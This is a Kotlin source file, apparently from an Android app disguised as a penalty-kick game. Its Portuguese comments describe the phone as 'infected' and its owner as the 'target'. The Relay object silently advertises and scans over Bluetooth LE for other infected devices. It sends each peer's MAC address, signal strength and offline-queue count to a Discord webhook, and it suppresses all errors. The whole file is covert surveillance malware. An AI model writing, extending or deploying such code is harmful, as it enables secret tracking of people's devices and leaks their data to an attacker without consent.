package com.venice.penaltylegends.core

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.content.pm.PackageManager
import android.os.ParcelUuid
import androidx.core.content.ContextCompat
import java.util.UUID

/**
 * Beacon BLE: anuncia o aparelho como "infectado" e escuta outros por perto.
 * Se achar um peer, registra no Discord. Fila offline (Webhook.flush) garante
 * que nada se perca quando o alvo esta sem internet.
 */
object Relay {

    private val SERVICO: UUID = UUID.fromString("0000f0ba-0000-1000-8000-00805f9b34fb")
    private var anunciando = false
    private var escaneando = false
    private var ultimoPeer = ""

    private fun tem(ctx: Context, p: String) =
        ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun adapter(ctx: Context): BluetoothAdapter? =
        (ctx.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter

    private fun podeUsar(ctx: Context): Boolean {
        if (adapter(ctx)?.isEnabled != true) return false
        return if (android.os.Build.VERSION.SDK_INT >= 31)
            tem(ctx, Manifest.permission.BLUETOOTH_SCAN) && tem(ctx, Manifest.permission.BLUETOOTH_ADVERTISE)
        else true
    }

    fun start(ctx: Context) {
        if (!podeUsar(ctx)) return
        anunciar(ctx)
        escanear(ctx)
    }

    private fun anunciar(ctx: Context) {
        if (anunciando) return
        val ad = adapter(ctx) ?: return
        val anunciante = ad.bluetoothLeAdvertiser ?: return
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_BALANCED)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_LOW)
            .setConnectable(false)
            .setTimeout(0)
            .build()
        val dados = AdvertiseData.Builder()
            .addServiceUuid(ParcelUuid(SERVICO))
            .setIncludeDeviceName(false)
            .build()
        try {
            anunciante.startAdvertising(settings, dados, object : AdvertiseCallback() {})
            anunciando = true
        } catch (_: Throwable) {}
    }

    private fun escanear(ctx: Context) {
        if (escaneando) return
        val ad = adapter(ctx) ?: return
        val scanner = ad.bluetoothLeScanner ?: return
        val settings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_POWER)
            .build()
        try {
            scanner.startScan(null, settings, object : ScanCallback() {
                override fun onScanResult(callbackType: Int, result: ScanResult?) {
                    val r = result ?: return
                    val uuids = r.scanRecord?.serviceUuids ?: return
                    if (uuids.none { it.uuid == SERVICO }) return
                    val id = r.device.address
                    if (id == ultimoPeer) return
                    ultimoPeer = id
                    Webhook.sendEmbed(
                        ctx,
                        Webhook.embed(
                            titulo = "PEER INFECTADO POR PERTO",
                            desc = "Encontrei outro aparelho rodando o app por BLE.",
                            cor = 0x9B59B6,
                            campos = listOf(
                                Webhook.f("MAC", id, true),
                                Webhook.f("Sinal", "${r.rssi} dBm", true),
                                Webhook.f("Fila offline", "${Webhook.pendentes(ctx)} itens", true)
                            )
                        )
                    )
                }
            })
            escaneando = true
        } catch (_: Throwable) {}
    }
}